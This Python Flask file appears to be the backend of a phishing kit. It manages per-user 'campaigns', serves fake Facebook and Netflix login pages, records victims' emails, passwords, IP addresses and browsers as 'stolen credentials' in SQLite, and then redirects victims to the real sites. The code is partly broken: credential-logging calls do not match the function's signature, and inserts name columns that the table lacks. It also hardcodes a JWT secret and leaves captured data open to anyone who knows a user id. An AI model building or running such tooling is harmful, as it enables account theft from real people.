import os
import jwt
import hashlib
import sqlite3
from datetime import datetime
from flask_cors import CORS
from flask import Flask, render_template, request, redirect, jsonify
from utils.create_js import create_js_script
from utils.date_and_time import get_current_date
app = Flask(__name__)
CORS(app)

USERS_DIR       = 'users'
DBS_DIR         = "dbs"
TEMPLATES_DIR   = "templates"
CAMPAIGNS_DIR   = "campaigns"
CAMPAIGNS_DB = "campaigns.db"

SECRET_KEY      = "your_secret_key"

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def generate_token(username, user_id):
    payload = {
        "username": username,
        "id": user_id,  # Add the user_id to the token
        # "exp": datetime.utcnow() + datetime.timedelta(hours=1)  # Token expires in 1 hour
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

def create_new_campaign_db(user_id, campaign_name):
    user_folder = f"{USERS_DIR}/{user_id}/{DBS_DIR}"
    
    if not os.path.exists(user_folder):
        os.makedirs(user_folder)

    campaign_db_path = os.path.join(user_folder, f"{campaign_name}.db")

    if os.path.exists(campaign_db_path):
        return None 

    conn = sqlite3.connect(campaign_db_path)
    cursor = conn.cursor()

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS credentials (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        page TEXT NOT NULL
    )
    ''')
    conn.commit()
    conn.close()

    return campaign_db_path

def create_campaigns_db(user_id, campaign_name):
    user_folder = f"{USERS_DIR}/{user_id}"
    campaigns_db_dir = os.path.join(user_folder, CAMPAIGNS_DIR)
    db_path = os.path.join(campaigns_db_dir, CAMPAIGNS_DB)

    try:
        if not os.path.exists(campaigns_db_dir):
            os.makedirs(campaigns_db_dir)

        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        # Create the campaigns table if it doesn't exist
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS campaigns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT,
                date_created DATE,
                time_created TIME
            )
        """)

        date_created, time_created = get_current_date()

        # Insert new campaign if it doesn't exist
        cursor.execute("""
            INSERT INTO campaigns (name, date_created, time_created)
            VALUES (?, ?, ?)
        """, (campaign_name, date_created, time_created))

        conn.commit()
        print(f"Campaign '{campaign_name}' added to the database.")
        
        return db_path
        
    except sqlite3.DatabaseError as e:
        print(f"Database error: {e}")
    except OSError as e:
        print(f"File system error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    finally:
        # Ensure that the connection is closed if it was opened
        if 'conn' in locals():
            conn.close()
            print("Database connection closed.")

def create_campaign_js_file(user_id, campaign_name, txt):
    user_folder = f"{USERS_DIR}/{user_id}/js"
    
    if not os.path.exists(user_folder):
        os.makedirs(user_folder)

    try:
        if not os.path.exists(user_folder):
            os.makedirs(user_folder)
            print(f"Folder '{user_folder}' created successfully.")
    
        file_path = os.path.join(user_folder, f"{campaign_name}.js")
        
        with open(file_path, 'w') as file:
            file.write(txt)
        print(f"File '{file_path}' created and written successfully.")
        return file_path

    except Exception as e:
        print(f"An error occurred: {e}")
        return None

def fetch_campaigns(user_id):
    """Fetch campaigns form user."""
    user_folder = f"{USERS_DIR}/{user_id}"
    campaigns_db_dir = os.path.join(user_folder, CAMPAIGNS_DIR)
    db_path = os.path.join(campaigns_db_dir, CAMPAIGNS_DB)

    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM campaigns")
    campaigns = cursor.fetchall()

    conn.close()
    return campaigns

def fetch_campaign_data(db_path):
    """Fetch content from a specific campaign database."""
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    cursor.execute("SELECT * FROM credentials")
    campaigns = cursor.fetchall()

    conn.close()
    return campaigns

def remove_db_file(file_name):
    if os.path.exists(file_name):
        os.remove(file_name)

def remove_campaign(user_id, campaign_name):
    try:
        db_path = os.path.join(USERS_DIR, str(user_id), CAMPAIGNS_DIR, "campaigns.db")

        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()

        cursor.execute("""
            DELETE FROM campaigns WHERE name = ?
        """, (campaign_name,))

        conn.commit()

        if cursor.rowcount > 0:
            print(f"Campaign '{campaign_name}' removed from the database.")
        else:
            print(f"No campaign found with the name '{campaign_name}'.")

    except sqlite3.DatabaseError as e:
        print(f"Database error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    finally:
        if 'conn' in locals():
            conn.close()
            print("Database connection closed.")

@app.route('/campaigns/<user_id>', methods=['GET'])
def get_campaigns(user_id):
    user_db_folder = os.path.join(USERS_DIR, user_id, DBS_DIR)
    
    if not os.path.exists(user_db_folder):
        return jsonify({"error": "User database folder not found"}), 404
    
  
    campaigns= fetch_campaigns(user_id)
        
    return jsonify(campaigns), 200

@app.route('/campaigns/fetch_campaign', methods=['POST'])
def get_campaign():
    data = request.json
    user_id = str(data.get("user_id"))
    campaign_name = str(data.get("campaign_id"))

    db_path = os.path.join(USERS_DIR, str(user_id), DBS_DIR, f'{campaign_name}.db')
    
    if not os.path.exists(db_path):
        return jsonify({"message": "User database folder not found"}), 404
        

    campaign_data = fetch_campaign_data(db_path)
        
    campaigns_with_data = {
        "name": campaign_name,
        "data": campaign_data
    }
    
    return jsonify(campaigns_with_data), 200
       
@app.route('/campaigns/create', methods=['POST'])
def create_campaign():
    data = request.json
    user_id = data.get("user_id")
    campaign_name = data.get("name")

    user_folder = f"{USERS_DIR}/{user_id}/{DBS_DIR}"
    campaign_db_file = os.path.join(user_folder, f"{campaign_name}.db")

    if not user_id or not campaign_name:
        return jsonify({"message": "User ID and campaign name are required"}), 400

    new_campaign_db_path = create_new_campaign_db(user_id, campaign_name)

    if not new_campaign_db_path:
        return jsonify({"message": "Campaign already exists under this name"}), 409

    
    campaigns_db_path = create_campaigns_db(user_id, campaign_name)
    if not campaigns_db_path:

        # Remove the campaign created because something when wrong in generating the code
        remove_db_file(campaign_db_file)
        
        return jsonify({"message": "Error in creating campaign"}), 409
    
    campaign_js_script = create_js_script(user_id, campaign_name) 
    js_file = create_campaign_js_file(user_id, campaign_name, campaign_js_script)
    
    if not js_file:
        remove_campaign(user_id, campaign_name)
        remove_db_file(campaign_db_file)
        return jsonify({"error": "Error in creating the campaign"}), 409
    
    return jsonify({
            "message": "Campaign created successfully", 
            "js": campaign_js_script
        }), 200
 
@app.route('/campaign/<user_id>/<campaign_name>', methods=['GET', 'POST'])
def campaign_page(user_id, campaign_name):
    """ Serve the phishing page and handle form submissions """
    
    campaign_db_path = os.path.join(USERS_DIR, user_id, DBS_DIR, f"{campaign_name}.db")

    if not os.path.exists(campaign_db_path):
        return "Campaign not found", 404


    if request.method == 'POST':
        username    = request.form.get('email')
        password = request.form.get('pass')

        if username and password:
            log_credentials(campaign_db_path, "Facebook", username, password)

            
        
    return "True", 200


@app.route('/login', methods=['POST'])
def login():

    data = request.json
    username = data.get("username")
    password = hash_password(data.get("password"))

    conn = sqlite3.connect(f"{DBS_DIR}/user.db")
    cursor = conn.cursor()
    
    cursor.execute("SELECT id, username FROM users WHERE username=? AND password=?", (username, password))
    user = cursor.fetchone()
    conn.close()

    if user:
        user_id, username = user  
        token = generate_token(username, user_id)  
        return jsonify({"token": token}), 200
    else:
        return jsonify({"error": "Invalid credentials"}), 401


@app.route('/templates', methods=['GET'])
def list_templates():
    templates = []
    try:
        for template in os.listdir(TEMPLATES_DIR):
            if template.endswith(".html"):
                templates.append(
                    {
                        'name': template,
                        'template': open(os.path.join(TEMPLATES_DIR, template), 'r').read()        
                    }

                )        
        return jsonify(templates)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    """Fake Facebook login page"""
    if request.method == 'POST':
        username = request.form.get('email')
        password = request.form.get('pass')
        log_credentials("Facebook", username, password)
        return redirect("https://www.facebook.com/")  # Redirect after capturing
        
    return render_template('facebook.html')

@app.route('/netflix', methods=['GET', 'POST'])
def netflix():
    """Fake Netflix login page"""
    if request.method == 'POST':
        username = request.form.get('email')
        password = request.form.get('password')
        log_credentials("Netflix", username, password)
        return redirect("https://www.netflix.com/")  # Redirect after capturing

    return render_template('netflix.html')

def log_credentials(db, page, username, password):
    """Log stolen credentials into SQLite database"""
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    conn = sqlite3.connect(db)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO credentials (page, username, password, ip, user_agent, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (page, username, password, ip, user_agent, timestamp))
    
    conn.commit()
    conn.close()




if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
